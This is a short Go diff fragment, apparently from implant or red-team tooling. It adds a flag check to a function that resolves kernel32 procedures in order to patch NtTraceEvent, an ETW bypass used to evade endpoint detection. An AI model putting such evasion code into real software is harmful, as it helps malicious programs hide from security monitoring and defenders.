@@ -9,6 +9,9 @@ import (
 )
 
 func etwNtTraceEvent() string {
+	if !patchETW {
+		return "NtTraceEvent bypass: disabled by EDR strategy"
+	}
 	k32 := syscall.NewLazyDLL("kernel32.dll")
 	getModuleHandle := k32.NewProc("GetModuleHandleW")
 	getProcAddress := k32.NewProc("GetProcAddress")
